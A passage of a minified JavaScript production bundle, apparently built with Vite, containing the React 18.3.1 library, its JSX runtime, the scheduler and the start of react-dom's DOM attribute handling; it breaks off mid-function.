function $m(a,r){for(var n=0;n<r.length;n++){const l=r[n];if(typeof l!="string"&&!Array.isArray(l)){for(const c in l)if(c!=="default"&&!(c in a)){const u=Object.getOwnPropertyDescriptor(l,c);u&&Object.defineProperty(a,c,u.get?u:{enumerable:!0,get:()=>l[c]})}}}return Object.freeze(Object.defineProperty(a,Symbol.toStringTag,{value:"Module"}))}(function(){const r=document.createElement("link").relList;if(r&&r.supports&&r.supports("modulepreload"))return;for(const c of document.querySelectorAll('link[rel="modulepreload"]'))l(c);new MutationObserver(c=>{for(const u of c)if(u.type==="childList")for(const h of u.addedNodes)h.tagName==="LINK"&&h.rel==="modulepreload"&&l(h)}).observe(document,{childList:!0,subtree:!0});function n(c){const u={};return c.integrity&&(u.integrity=c.integrity),c.referrerPolicy&&(u.referrerPolicy=c.referrerPolicy),c.crossOrigin==="use-credentials"?u.credentials="include":c.crossOrigin==="anonymous"?u.credentials="omit":u.credentials="same-origin",u}function l(c){if(c.ep)return;c.ep=!0;const u=n(c);fetch(c.href,u)}})();function mf(a){return a&&a.__esModule&&Object.prototype.hasOwnProperty.call(a,"default")?a.default:a}var ic={exports:{}},Oa={},lc={exports:{}},Pe={};var _h;function Dm(){if(_h)return Pe;_h=1;var a=Symbol.for("react.element"),r=Symbol.for("react.portal"),n=Symbol.for("react.fragment"),l=Symbol.for("react.strict_mode"),c=Symbol.for("react.profiler"),u=Symbol.for("react.provider"),h=Symbol.for("react.context"),m=Symbol.for("react.forward_ref"),x=Symbol.for("react.suspense"),y=Symbol.for("react.memo"),v=Symbol.for("react.lazy"),k=Symbol.iterator;function _(R){return R===null||typeof R!="object"?null:(R=k&&R[k]||R["@@iterator"],typeof R=="function"?R:null)}var S={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},w=Object.assign,E={};function T(R,M,be){this.props=R,this.context=M,this.refs=E,this.updater=be||S}T.prototype.isReactComponent={},T.prototype.setState=function(R,M){if(typeof R!="object"&&typeof R!="function"&&R!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,R,M,"setState")},T.prototype.forceUpdate=function(R){this.updater.enqueueForceUpdate(this,R,"forceUpdate")};function D(){}D.prototype=T.prototype;function z(R,M,be){this.props=R,this.context=M,this.refs=E,this.updater=be||S}var I=z.prototype=new D;I.constructor=z,w(I,T.prototype),I.isPureReactComponent=!0;var H=Array.isArray,te=Object.prototype.hasOwnProperty,J={current:null},F={key:!0,ref:!0,__self:!0,__source:!0};function ne(R,M,be){var je,Ce={},_e=null,Q=null;if(M!=null)for(je in M.ref!==void 0&&(Q=M.ref),M.key!==void 0&&(_e=""+M.key),M)te.call(M,je)&&!F.hasOwnProperty(je)&&(Ce[je]=M[je]);var fe=arguments.length-2;if(fe===1)Ce.children=be;else if(1<fe){for(var xe=Array(fe),B=0;B<fe;B++)xe[B]=arguments[B+2];Ce.children=xe}if(R&&R.defaultProps)for(je in fe=R.defaultProps,fe)Ce[je]===void 0&&(Ce[je]=fe[je]);return{$$typeof:a,type:R,key:_e,ref:Q,props:Ce,_owner:J.current}}function ue(R,M){return{$$typeof:a,type:R.type,key:M,ref:R.ref,props:R.props,_owner:R._owner}}function Ee(R){return typeof R=="object"&&R!==null&&R.$$typeof===a}function ze(R){var M={"=":"=0",":":"=2"};return"$"+R.replace(/[=:]/g,function(be){return M[be]})}var Fe=/\/+/g;function Re(R,M){return typeof R=="object"&&R!==null&&R.key!=null?ze(""+R.key):M.toString(36)}function de(R,M,be,je,Ce){var _e=typeof R;(_e==="undefined"||_e==="boolean")&&(R=null);var Q=!1;if(R===null)Q=!0;else switch(_e){case"string":case"number":Q=!0;break;case"object":switch(R.$$typeof){case a:case r:Q=!0}}if(Q)return Q=R,Ce=Ce(Q),R=je===""?"."+Re(Q,0):je,H(Ce)?(be="",R!=null&&(be=R.replace(Fe,"$&/")+"/"),de(Ce,M,be,"",function(B){return B})):Ce!=null&&(Ee(Ce)&&(Ce=ue(Ce,be+(!Ce.key||Q&&Q.key===Ce.key?"":(""+Ce.key).replace(Fe,"$&/")+"/")+R)),M.push(Ce)),1;if(Q=0,je=je===""?".":je+":",H(R))for(var fe=0;fe<R.length;fe++){_e=R[fe];var xe=je+Re(_e,fe);Q+=de(_e,M,be,xe,Ce)}else if(xe=_(R),typeof xe=="function")for(R=xe.call(R),fe=0;!(_e=R.next()).done;)_e=_e.value,xe=je+Re(_e,fe++),Q+=de(_e,M,be,xe,Ce);else if(_e==="object")throw M=String(R),Error("Objects are not valid as a React child (found: "+(M==="[object Object]"?"object with keys {"+Object.keys(R).join(", ")+"}":M)+"). If you meant to render a collection of children, use an array instead.");return Q}function ae(R,M,be){if(R==null)return R;var je=[],Ce=0;return de(R,je,"","",function(_e){return M.call(be,_e,Ce++)}),je}function we(R){if(R._status===-1){var M=R._result;M=M(),M.then(function(be){(R._status===0||R._status===-1)&&(R._status=1,R._result=be)},function(be){(R._status===0||R._status===-1)&&(R._status=2,R._result=be)}),R._status===-1&&(R._status=0,R._result=M)}if(R._status===1)return R._result.default;throw R._result}var he={current:null},U={transition:null},Z={ReactCurrentDispatcher:he,ReactCurrentBatchConfig:U,ReactCurrentOwner:J};function ee(){throw Error("act(...) is not supported in production builds of React.")}return Pe.Children={map:ae,forEach:function(R,M,be){ae(R,function(){M.apply(this,arguments)},be)},count:function(R){var M=0;return ae(R,function(){M++}),M},toArray:function(R){return ae(R,function(M){return M})||[]},only:function(R){if(!Ee(R))throw Error("React.Children.only expected to receive a single React element child.");return R}},Pe.Component=T,Pe.Fragment=n,Pe.Profiler=c,Pe.PureComponent=z,Pe.StrictMode=l,Pe.Suspense=x,Pe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Z,Pe.act=ee,Pe.cloneElement=function(R,M,be){if(R==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+R+".");var je=w({},R.props),Ce=R.key,_e=R.ref,Q=R._owner;if(M!=null){if(M.ref!==void 0&&(_e=M.ref,Q=J.current),M.key!==void 0&&(Ce=""+M.key),R.type&&R.type.defaultProps)var fe=R.type.defaultProps;for(xe in M)te.call(M,xe)&&!F.hasOwnProperty(xe)&&(je[xe]=M[xe]===void 0&&fe!==void 0?fe[xe]:M[xe])}var xe=arguments.length-2;if(xe===1)je.children=be;else if(1<xe){fe=Array(xe);for(var B=0;B<xe;B++)fe[B]=arguments[B+2];je.children=fe}return{$$typeof:a,type:R.type,key:Ce,ref:_e,props:je,_owner:Q}},Pe.createContext=function(R){return R={$$typeof:h,_currentValue:R,_currentValue2:R,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},R.Provider={$$typeof:u,_context:R},R.Consumer=R},Pe.createElement=ne,Pe.createFactory=function(R){var M=ne.bind(null,R);return M.type=R,M},Pe.createRef=function(){return{current:null}},Pe.forwardRef=function(R){return{$$typeof:m,render:R}},Pe.isValidElement=Ee,Pe.lazy=function(R){return{$$typeof:v,_payload:{_status:-1,_result:R},_init:we}},Pe.memo=function(R,M){return{$$typeof:y,type:R,compare:M===void 0?null:M}},Pe.startTransition=function(R){var M=U.transition;U.transition={};try{R()}finally{U.transition=M}},Pe.unstable_act=ee,Pe.useCallback=function(R,M){return he.current.useCallback(R,M)},Pe.useContext=function(R){return he.current.useContext(R)},Pe.useDebugValue=function(){},Pe.useDeferredValue=function(R){return he.current.useDeferredValue(R)},Pe.useEffect=function(R,M){return he.current.useEffect(R,M)},Pe.useId=function(){return he.current.useId()},Pe.useImperativeHandle=function(R,M,be){return he.current.useImperativeHandle(R,M,be)},Pe.useInsertionEffect=function(R,M){return he.current.useInsertionEffect(R,M)},Pe.useLayoutEffect=function(R,M){return he.current.useLayoutEffect(R,M)},Pe.useMemo=function(R,M){return he.current.useMemo(R,M)},Pe.useReducer=function(R,M,be){return he.current.useReducer(R,M,be)},Pe.useRef=function(R){return he.current.useRef(R)},Pe.useState=function(R){return he.current.useState(R)},Pe.useSyncExternalStore=function(R,M,be){return he.current.useSyncExternalStore(R,M,be)},Pe.useTransition=function(){return he.current.useTransition()},Pe.version="18.3.1",Pe}var Nh;function Lc(){return Nh||(Nh=1,lc.exports=Dm()),lc.exports}var Sh;function zm(){if(Sh)return Oa;Sh=1;var a=Lc(),r=Symbol.for("react.element"),n=Symbol.for("react.fragment"),l=Object.prototype.hasOwnProperty,c=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,u={key:!0,ref:!0,__self:!0,__source:!0};function h(m,x,y){var v,k={},_=null,S=null;y!==void 0&&(_=""+y),x.key!==void 0&&(_=""+x.key),x.ref!==void 0&&(S=x.ref);for(v in x)l.call(x,v)&&!u.hasOwnProperty(v)&&(k[v]=x[v]);if(m&&m.defaultProps)for(v in x=m.defaultProps,x)k[v]===void 0&&(k[v]=x[v]);return{$$typeof:r,type:m,key:_,ref:S,props:k,_owner:c.current}}return Oa.Fragment=n,Oa.jsx=h,Oa.jsxs=h,Oa}var Eh;function Um(){return Eh||(Eh=1,ic.exports=zm()),ic.exports}var s=Um(),j=Lc();const Mc=mf(j),Lm=$m({__proto__:null,default:Mc},[j]);var Zi={},oc={exports:{}},Lt={},cc={exports:{}},uc={};var Ch;function Mm(){return Ch||(Ch=1,(function(a){function r(U,Z){var ee=U.length;U.push(Z);e:for(;0<ee;){var R=ee-1>>>1,M=U[R];if(0<c(M,Z))U[R]=Z,U[ee]=M,ee=R;else break e}}function n(U){return U.length===0?null:U[0]}function l(U){if(U.length===0)return null;var Z=U[0],ee=U.pop();if(ee!==Z){U[0]=ee;e:for(var R=0,M=U.length,be=M>>>1;R<be;){var je=2*(R+1)-1,Ce=U[je],_e=je+1,Q=U[_e];if(0>c(Ce,ee))_e<M&&0>c(Q,Ce)?(U[R]=Q,U[_e]=ee,R=_e):(U[R]=Ce,U[je]=ee,R=je);else if(_e<M&&0>c(Q,ee))U[R]=Q,U[_e]=ee,R=_e;else break e}}return Z}function c(U,Z){var ee=U.sortIndex-Z.sortIndex;return ee!==0?ee:U.id-Z.id}if(typeof performance=="object"&&typeof performance.now=="function"){var u=performance;a.unstable_now=function(){return u.now()}}else{var h=Date,m=h.now();a.unstable_now=function(){return h.now()-m}}var x=[],y=[],v=1,k=null,_=3,S=!1,w=!1,E=!1,T=typeof setTimeout=="function"?setTimeout:null,D=typeof clearTimeout=="function"?clearTimeout:null,z=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function I(U){for(var Z=n(y);Z!==null;){if(Z.callback===null)l(y);else if(Z.startTime<=U)l(y),Z.sortIndex=Z.expirationTime,r(x,Z);else break;Z=n(y)}}function H(U){if(E=!1,I(U),!w)if(n(x)!==null)w=!0,we(te);else{var Z=n(y);Z!==null&&he(H,Z.startTime-U)}}function te(U,Z){w=!1,E&&(E=!1,D(ne),ne=-1),S=!0;var ee=_;try{for(I(Z),k=n(x);k!==null&&(!(k.expirationTime>Z)||U&&!ze());){var R=k.callback;if(typeof R=="function"){k.callback=null,_=k.priorityLevel;var M=R(k.expirationTime<=Z);Z=a.unstable_now(),typeof M=="function"?k.callback=M:k===n(x)&&l(x),I(Z)}else l(x);k=n(x)}if(k!==null)var be=!0;else{var je=n(y);je!==null&&he(H,je.startTime-Z),be=!1}return be}finally{k=null,_=ee,S=!1}}var J=!1,F=null,ne=-1,ue=5,Ee=-1;function ze(){return!(a.unstable_now()-Ee<ue)}function Fe(){if(F!==null){var U=a.unstable_now();Ee=U;var Z=!0;try{Z=F(!0,U)}finally{Z?Re():(J=!1,F=null)}}else J=!1}var Re;if(typeof z=="function")Re=function(){z(Fe)};else if(typeof MessageChannel<"u"){var de=new MessageChannel,ae=de.port2;de.port1.onmessage=Fe,Re=function(){ae.postMessage(null)}}else Re=function(){T(Fe,0)};function we(U){F=U,J||(J=!0,Re())}function he(U,Z){ne=T(function(){U(a.unstable_now())},Z)}a.unstable_IdlePriority=5,a.unstable_ImmediatePriority=1,a.unstable_LowPriority=4,a.unstable_NormalPriority=3,a.unstable_Profiling=null,a.unstable_UserBlockingPriority=2,a.unstable_cancelCallback=function(U){U.callback=null},a.unstable_continueExecution=function(){w||S||(w=!0,we(te))},a.unstable_forceFrameRate=function(U){0>U||125<U?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):ue=0<U?Math.floor(1e3/U):5},a.unstable_getCurrentPriorityLevel=function(){return _},a.unstable_getFirstCallbackNode=function(){return n(x)},a.unstable_next=function(U){switch(_){case 1:case 2:case 3:var Z=3;break;default:Z=_}var ee=_;_=Z;try{return U()}finally{_=ee}},a.unstable_pauseExecution=function(){},a.unstable_requestPaint=function(){},a.unstable_runWithPriority=function(U,Z){switch(U){case 1:case 2:case 3:case 4:case 5:break;default:U=3}var ee=_;_=U;try{return Z()}finally{_=ee}},a.unstable_scheduleCallback=function(U,Z,ee){var R=a.unstable_now();switch(typeof ee=="object"&&ee!==null?(ee=ee.delay,ee=typeof ee=="number"&&0<ee?R+ee:R):ee=R,U){case 1:var M=-1;break;case 2:M=250;break;case 5:M=1073741823;break;case 4:M=1e4;break;default:M=5e3}return M=ee+M,U={id:v++,callback:Z,priorityLevel:U,startTime:ee,expirationTime:M,sortIndex:-1},ee>R?(U.sortIndex=ee,r(y,U),n(x)===null&&U===n(y)&&(E?(D(ne),ne=-1):E=!0,he(H,ee-R))):(U.sortIndex=M,r(x,U),w||S||(w=!0,we(te))),U},a.unstable_shouldYield=ze,a.unstable_wrapCallback=function(U){var Z=_;return function(){var ee=_;_=Z;try{return U.apply(this,arguments)}finally{_=ee}}}})(uc)),uc}var Th;function Fm(){return Th||(Th=1,cc.exports=Mm()),cc.exports}var Rh;function Bm(){if(Rh)return Lt;Rh=1;var a=Lc(),r=Fm();function n(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,i=1;i<arguments.length;i++)t+="&args[]="+encodeURIComponent(arguments[i]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var l=new Set,c={};function u(e,t){h(e,t),h(e+"Capture",t)}function h(e,t){for(c[e]=t,e=0;e<t.length;e++)l.add(t[e])}var m=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),x=Object.prototype.hasOwnProperty,y=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,v={},k={};function _(e){return x.call(k,e)?!0:x.call(v,e)?!1:y.test(e)?k[e]=!0:(v[e]=!0,!1)}function S(e,t,i,o){if(i!==null&&i.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return o?!1:i!==null?!i.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function w(e,t,i,o){if(t===null||typeof t>"u"||S(e,t,i,o))return!0;if(o)return!1;if(i!==null)switch(i.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function E(e,t,i,o,d,f,g){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=o,this.attributeNamespace=d,this.mustUseProperty=i,this.propertyName=e,this.type=t,this.sanitizeURL=f,this.removeEmptyString=g}var T={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){T[e]=new E(e,0,!1,e,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];T[t]=new E(t,1,!1,e[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(e){T[e]=new E(e,2,!1,e.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){T[e]=new E(e,2,!1,e,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){T[e]=new E(e,3,!1,e.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(e){T[e]=new E(e,3,!0,e,null,!1,!1)}),["capture","download"].forEach(function(e){T[e]=new E(e,4,!1,e,null,!1,!1)}),["cols","rows","size","span"].forEach(function(e){T[e]=new E(e,6,!1,e,null,!1,!1)}),["rowSpan","start"].forEach(function(e){T[e]=new E(e,5,!1,e.toLowerCase(),null,!1,!1)});var D=/[\-:]([a-z])/g;function z(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(D,z);T[t]=new E(t,1,!1,e,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(D,z);T[t]=new E(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(D,z);T[t]=new E(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(e){T[e]=new E(e,1,!1,e.toLowerCase(),null,!1,!1)}),T.xlinkHref=new E("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(e){T[e]=new E(e,1,!1,e.toLowerCase(),null,!0,!0)});function I(e,t,i,o){var d=T.hasOwnProperty(t)?T[t]:null;(d!==null?d.type!==0:o||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(w(t,i,d,o)&&(i=null),o||d===null?_(t)&&(i===null?e.removeAttribute(t):e.setAttribute(t,""+i)):d.mustUseProperty?e[d.propertyName]=i===null?d.type===3?!1:"":i:(t=d.attributeName,o=d.attributeNamespace,i===null?e.removeAttribute(t):(d=d.type,i=d===3||d===4&&i===!0?"":""+i,o?e.setAttributeNS(o,t,i):e.setAttribute(t,i))))}var H=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,te=Symbol.for("react.element"),J=Symbol.for("react.portal"),F=Symbol.for("react.fragment"),ne=Symbol.for("react.strict_mode"),ue=Symbol.for("react.profiler"),Ee=Symbol.for("react.provider"),ze=Symbol.for("react.context"),Fe=Symbol.for("react.forward_ref"),Re=Symbol.for("react.suspense"),de=Symbol.for("react.suspense_list"),ae=Symbol.for("react.memo"),we=Symbol.for("react.lazy"),he=Symbol.for("react.offscreen"),U=Symbol.iterator;function Z(e){return e===null||typeof e!="object"?null:(e=U&&e[U]||e["@@iterator"],typeof e=="function"?e:null)}var ee=Object.assign,R;function M(e){if(R===void 0)try{throw Error()}catch(i){var t=i.stack.trim().match(/\n( *(at )?)/);R=t&&t[1]||""}return`
`+R+e}var be=!1;function je(e,t){if(!e||be)return"";be=!0;var i=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch($){var o=$}Reflect.construct(e,[],t)}else{try{t.call()}catch($){o=$}e.call(t.prototype)}else{try{throw Error()}catch($){o=$}e()}}catch($){if($&&o&&typeof $.stack=="string"){for(var d=$.stack.split(`
`),f=o.stack.split(`
`),g=d.length-1,b=f.length-1;1<=g&&0<=b&&d[g]!==f[b];)b--;for(;1<=g&&0<=b;g--,b--)if(d[g]!==f[b]){if(g!==1||b!==1)do if(g--,b--,0>b||d[g]!==f[b]){var N=`
`+d[g].replace(" at new "," at ");return e.displayName&&N.includes("<anonymous>")&&(N=N.replace("<anonymous>",e.displayName)),N}while(1<=g&&0<=b);break}}}finally{be=!1,Error.prepareStackTrace=i}return(e=e?e.displayName||e.name:"")?M(e):""}function Ce(e){switch(e.tag){case 5:return M(e.type);case 16:return M("Lazy");case 13:return M("Suspense");case 19:return M("SuspenseList");case 0:case 2:case 15:return e=je(e.type,!1),e;case 11:return e=je(e.type.render,!1),e;case 1:return e=je(e.type,!0),e;default:return""}}function _e(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case F:return"Fragment";case J:return"Portal";case ue:return"Profiler";case ne:return"StrictMode";case Re:return"Suspense";case de:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case ze:return(e.displayName||"Context")+".Consumer";case Ee:return(e._context.displayName||"Context")+".Provider";case Fe:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case ae:return t=e.displayName||null,t!==null?t:_e(e.type)||"Memo";case we:t=e._payload,e=e._init;try{return _e(e(t))}catch{}}return null}function Q(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return _e(t);case 8:return t===ne?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function fe(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function xe(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function B(e){var t=xe(e)?"checked":"value",i=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),o=""+e[t];if(!e.hasOwnProperty(t)&&typeof i<"u"&&typeof i.get=="function"&&typeof i.set=="function"){var d=i.get,f=i.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return d.call(this)},set:function(g){o=""+g,f.call(this,g)}}),Object.defineProperty(e,t,{enumerable:i.enumerable}),{getValue:function(){return o},setValue:function(g){o=""+g},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ae(e){e._valueTracker||(e._valueTracker=B(e))}function et(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var i=t.getValue(),o="";return e&&(o=xe(e)?e.checked?"true":"false":e.value),e=o,e!==i?(t.setValue(e),!0):!1}function ct(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Ne(e,t){var i=t.checked;return ee({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:i??e._wrapperState.initialChecked})}function kt(e,t){var i=t.defaultValue==null?"":t.defaultValue,o=t.checked!=null?t.checked:t.defaultChecked;i=fe(t.value!=null?t.value:i),e._wrapperState={initialChecked:o,initialValue:i,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function dr(e,t){t=t.checked,t!=null&&I(e,"checked",t,!1)}function it(e,t){dr(e,t);var i=fe(t.value),o=t.type;if(i!=null)o==="number"?(i===0&&e.value===""||e.value!=i)&&(e.value=""+i):e.value!==""+i&&(e.value=""+i);else if(o==="submit"||o==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?At(e,t.type,i):t.hasOwnProperty("defaultValue")&&At(e,t.type,fe(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function ft(e,t,i){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var o=t.type;if(!(o!=="submit"&&o!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,i||t===e.value||(e.value=t),e.defaultValue=t}i=e.name,i!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,i!==""&&(e.name=i)}function At(e,t,i){(t!=="number"||ct(e.ownerDocument)!==e)&&(i==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+i&&(e.defaultValue=""+i))}var st=Array.isArray;function _t(e,t,i,o){if(e=e.options,t){t={};for(var d=0;d<i.length;d++)t["$"+i[d]]=!0;for(i=0;i<e.length;i++)d=t.hasOwnProperty("$"+e[i].value),e[i].selected!==d&&(e[i].selected=d),d&&o&&(e[i].defaultSelected=!0)}else{for(i=""+fe(i),t=null,d=0;d<e.length;d++){if(e[d].value===i){e[d].selected=!0,o&&(e[d].defaultSelected=!0);return}t!==null||e[d].disabled||(t=e[d])}t!==null&&(t.selected=!0)}}function hr(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(n(91));return ee({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Cr(e,t){var i=t.value;if(i==null){if(i=t.children,t=t.defaultValue,i!=null){if(t!=null)throw Error(n(92));if(st(i)){if(1<i.length)throw Error(n(93));i=i[0]}t=i}t==null&&(t=""),i=t}e._wrapperState={initialValue:fe(i)}}function Tr(e,t){var i=fe(t.value),o=fe(t.defaultValue);i!=null&&(i=""+i,i!==e.value&&(e.value=i),t.defaultValue==null&&e.defaultValue!==i&&(e.defaultValue=i)),o!=null&&(e.defaultValue=""+o)}function Rr(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function Pr(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function fr(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?Pr(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var er,os=(function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,i,o,d){MSApp.execUnsafeLocalFunction(function(){return e(t,i,o,d)})}:e})(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(er=er||document.createElement("div"),er.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=er.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Ft(e,t){if(t){var i=e.firstChild;if(i&&i===e.lastChild&&i.nodeType===3){i.nodeValue=t;return}}e.textContent=t}var Oe={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},zs=["Webkit","ms","Moz","O"];Object.keys(Oe).forEach(function(e){zs.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Oe[t]=Oe[e]})});function Ar(e,t,i){return t==null||typeof t=="boolean"||t===""?"":i||typeof t!="number"||t===0||Oe.hasOwnProperty(e)&&Oe[e]?(""+t).trim():t+"px"}function tr(e,t){e=e.style;for(var i in t)if(t.hasOwnProperty(i)){var o=i.indexOf("--")===0,d=Ar(i,t[i],o);i==="float"&&(i="cssFloat"),o?e.setProperty(i,d):e[i]=d}}var Bt=ee({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Br(e,t){if(t){if(Bt[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(n(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(n(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(n(61))}if(t.style!=null&&typeof t.style!="object")throw Error(n(62))}}function 